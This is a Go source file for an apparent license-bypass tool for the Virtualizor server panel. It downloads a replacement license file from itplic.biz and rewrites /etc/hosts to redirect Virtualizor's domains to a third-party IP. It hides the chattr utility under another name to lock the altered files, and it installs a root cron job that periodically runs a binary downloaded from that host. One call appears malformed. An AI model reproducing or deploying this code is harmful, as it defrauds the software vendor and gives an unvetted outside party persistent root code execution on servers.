package main

import (
	"encoding/json"
	"fmt"
	"time"
	"io/ioutil"
	"net/http"
	"strings"
	"bytes"
	"os/exec"
	"os"
	"io"
	"flag"
	"runtime"
	"bufio"
	"github.com/gookit/color"
	"github.com/mbndr/figlet4go"
)
var file string

const (
	ErrorColor = "\033[1;31m%s\033[0m"
	DebugColor = "\033[0;36m%s\033[0m"
	InfoColor  = "\033[1;32m%s\033[0m"
)
func printcolor(color string, str string) {
	fmt.Printf(color, str)
	fmt.Println()
}
func file_exists(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}
func exec_output(of string) string {
	var out bytes.Buffer
	cmd := exec.Command("bash", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}
	return strings.Split(out.String(), "\n")[0]
}

func exec_outputs(of string) []string {
	var out bytes.Buffer
	cmd := exec.Command("bash", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return []string{}
	}
	return strings.Split(out.String(), "\n")
}

func _exec(of string) string {
	var out bytes.Buffer
	cmd := exec.Command("sh", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}
	result := out.String()

	if len(result) > 0 {
		if result[len(result)-1:] == "\n" {
			result = result[0 : len(result)-1]
		}
	}

	return result
}
func file_get_contents(filename string) string {
	data, _ := ioutil.ReadFile(filename)
	return string(data)
}

func checklicvirt() {
file = _exec("/usr/local/emps/bin/php /usr/local/virtualizor/cli.php -l  &> /usr/local/cps/data/.virtlic")
filech := file_get_contents("/usr/local/cps/data/.virtlic")
			postt := strings.Contains(filech, "Status : Active")
			if postt {
			fmt.Println()
				printcolor(InfoColor, "You Virtualizor license does not require an update or activation!")
				fmt.Println()
				setupCron()
				_exec("rm -rf /usr/local/cps/data/.virtlic")
				os.Exit(1)
			}
}

type Data struct {
	Status string `json:"status"`
	Brand  string `json:"brand_name"`
	Domain string `json:"domain_name"`
	Expiry string `json:"expire_date"`
}
func setupCron() {
	cronfile, err := os.Create("/etc/cron.d/lic_virtualizor")
	if err != nil {
		fmt.Println(err)
	}
	cronfile.WriteString("PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin\n\n0 */4 * * * root /usr/bin/lic_virtualizor -checklic >/dev/null 2>&1\n@reboot root /usr/bin/lic_virtualizor -checklic &>/dev/null")
}

func main() {
	var checklic bool

flag.BoolVar(&checklic, "checklic", false, "Check License")
flag.Parse()
if checklic {
		checklicvirt()
	}
	resp, err := http.Get("http://itplic.biz/api/getinfo?key=virtualizor")
	if err != nil {
		os.Exit(1)
	}
	byteResult, err := ioutil.ReadAll(resp.Body)
	
	var f Data
	err = json.Unmarshal(byteResult, &f)
	var res map[string]interface{}
	json.Unmarshal([]byte(byteResult), &res)
	if f.Status == "success" {
	CallClear()
	ascii := figlet4go.NewAsciiRender()

	options := figlet4go.NewRenderOptions()
	options.FontName = "slant"
	ascii.LoadFont("/usr/local/go/bin")
	str := fmt.Sprint(res["brand_name"])
	renderStr, _ := ascii.RenderOpts(str, options)
	color.Style{color.FgWhite, color.OpBold}.Printf(renderStr)
	color.Style{color.FgWhite, color.OpBold}.Println("---------------------- Licensing System Started ----------------------")
		color.Style{color.FgWhite, color.OpBold}.Printf("|Our Website:      ")
		color.Style{color.FgWhite, color.OpBold}.Println(res["domain_name"])
		color.Style{color.FgWhite, color.OpBold}.Println("|License Type:     Premium")
		color.Style{color.FgWhite, color.OpBold}.Println("|License Version:  v3.60")
		host, _ := os.Hostname()
		color.Style{color.FgWhite, color.OpBold}.Printf("|Hostname:         ")
		color.Style{color.FgWhite, color.OpBold}.Println(host)
		color.Style{color.FgWhite, color.OpBold}.Printf("|Server IP:        ")
		curl := exec.Command("curl", "-s", "https://ipinfo.io/ip")
		out, err := curl.Output()
		if err != nil {
			fmt.Println(err)
			return
		}
		ip := string(out)
		color.Style{color.FgWhite, color.OpBold}.Println(ip)
		color.Style{color.FgWhite, color.OpBold}.Printf("")
		color.Style{color.FgWhite, color.OpBold}.Println("---------------------------------------------------------------------")
		color.Style{color.FgWhite, color.OpBold}.Printf("Today is ")
		dt := time.Now()
		color.Style{color.FgWhite, color.OpBold}.Println(dt.Format("2006-01-02"))
		color.Style{color.FgWhite, color.OpBold}.Printf("Your Virtualizor License will need an update on ")
		color.Style{color.FgWhite, color.OpBold}.Println(res["expire_date"])
		fmt.Println()
		checklicvirt()
	virtualizor_checker()
	color.Style{color.FgWhite, color.OpBold}.Print("cPanel Virtualizor require to update.This update is done automatclly by the system.Started...")
	mv("/usr/bin/chattr", "/usr/bin/comp0")
	checklicvirt()
	chattrm("/usr/local/virtualizor/license2.php")
	downloadFile("wget -O /usr/local/virtualizor/license2.php https://itplic.biz/api/virtualizor?key=virtualizor")
	chattrp("/usr/local/virtualizor/license2.php")
	chattrm("/etc/hosts")
	filePath := "/etc/hosts"
    targetLine := "188.40.148.91 files.virtualizor.com virtualizor.com www.virtualizor.com www.files.virtualizor.com api.virtualizor.com www.api.virtualizor.com"

    // Open file for reading
    f, err := os.Open(filePath)
    if err != nil {
        panic(err)
    }
    defer f.Close()

    // Read file line by line
    scanner := bufio.NewScanner(f)
    found := false
    for scanner.Scan() {
        line := scanner.Text()
        if line == targetLine {
            found = true
            break
        }
    }

    // If target line not found, append it to file
    if !found {
        f, err = os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, 0644)
        if err != nil {
            panic(err)
        }
        defer f.Close()

        _, err = fmt.Fprintln(f, targetLine)
        if err != nil {
            panic(err)
        }
	}
	chattrp("/etc/hosts")
	color.Style{color.FgGreen, color.OpBold}.Println("OK")
	printcolor(InfoColor, "License was updated or renewed succesfully")
				fmt.Println()
		color.Style{color.FgGreen, color.OpBold}.Println("To reissue your cPanel license you can use: lic_virtualizor")
		fmt.Println()
	file_checker()
	setupCron()
	os.Exit(1)
	} else {
		color.Red.Println("Invalid License.")
		chattrm("/usr/local/virtualizor/license2.php")
		rm("/usr/local/virtualizor/license2.php")
		
	}
}
func cron(filepath string) error {
      cmd := exec.Command("chmod", "0644", filepath)
      return cmd.Run()
}
func run(filepath string) error {
      // run shell
      cmd := exec.Command(filepath)
      return cmd.Run()
}
func chattrp(filepath string) error {
      cmd := exec.Command("comp0", "+i", "+a", filepath)
      return cmd.Run()
}
func chattrm(filepath string) error {
      cmd := exec.Command("comp0", "-i", "-a", filepath)
      return cmd.Run()
}
func chmod(filepath string) error {
      cmd := exec.Command("chmod", "+x", filepath)
      return cmd.Run()
}
func rm(filepath string) error {
      cmd := exec.Command("rm", "-rf", filepath)
      return cmd.Run()
}
func mv(filepath1 string,  filepath2 string) error {
      cmd := exec.Command("mv", "-f", filepath1, filepath2)
      return cmd.Run()
}

var clear map[string]func() //create a map for storing clear funcs

func init() {
    clear = make(map[string]func()) //Initialize it
    clear["linux"] = func() { 
        cmd := exec.Command("clear") //Linux example, its tested
        cmd.Stdout = os.Stdout
        cmd.Run()
    }
    clear["windows"] = func() {
        cmd := exec.Command("cmd", "/c", "cls") //Windows example, its tested 
        cmd.Stdout = os.Stdout
        cmd.Run()
    }
}

func CallClear() {
    value, ok := clear[runtime.GOOS] //runtime.GOOS -> linux, windows, darwin etc.
    if ok { //if we defined a clear func for that platform:
        value()  //we execute it
    } else { //unsupported platform
        panic("Your platform is unsupported! I can't clear terminal screen :(")
    }
}
func file_checker() {
   if _, err := os.Stat("/usr/bin/lic_virtualizor"); err == nil {
   } else {
      downloadFile("/usr/bin/lic_virtualizor", "http://mirror.itplic.biz/api/files/virtualizor/lic_virtualizor")
	  chmod("/usr/bin/lic_virtualizor")
   }
}
func virtualizor_checker() {
   if _, err := os.Stat("/usr/local/virtualizor/scripts/cron.php"); err == nil {
   } else {
    color.Red.Println("virtualizor Not Installed.")
	color.Style{color.FgGreen, color.OpBold}.Println("Installing virtualizor Please Wait ...")
	downloadFile("/root/install.sh", "http://files.virtualizor.com/install.sh")
	chmod("/root/install.sh")
	cmd := exec.Command("/root/install.sh")

	var stdoutBuf bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &stdoutBuf)

	err := cmd.Run()
	if err != nil {
		fmt.Printf("lic Failed")
	}
	outStr := string(stdoutBuf.Bytes())
	fmt.Printf(outStr)
	color.Style{color.FgGreen, color.OpBold}.Println("Successfully Installed.")
	rm("/root/install.sh")
   }
}
func sed(old string, new string, file string) {
	filePath := file
	fileData, err := ioutil.ReadFile(filePath)
	if err != nil {

	} else {
		fileString := string(fileData)
		fileString = strings.ReplaceAll(fileString, old, new)
		fileData = []byte(fileString)
		_ = ioutil.WriteFile(filePath, fileData, 600)
	}
}
func getData(fileurl string) string {
	resp, err := http.Get(fileurl)
	if err != nil {
		fmt.Println("Unable to get Data")
	}
	defer resp.Body.Close()
	html, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)

	}
	data := string(html[:])
	data = strings.TrimSpace(data)
	return data
}
func downloadFile(path string, url string) (error) {

	// Create the file
	out, err := os.Create(path)
	if err != nil { return err }
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil { return err }
	defer resp.Body.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil { return err }

	return nil
}
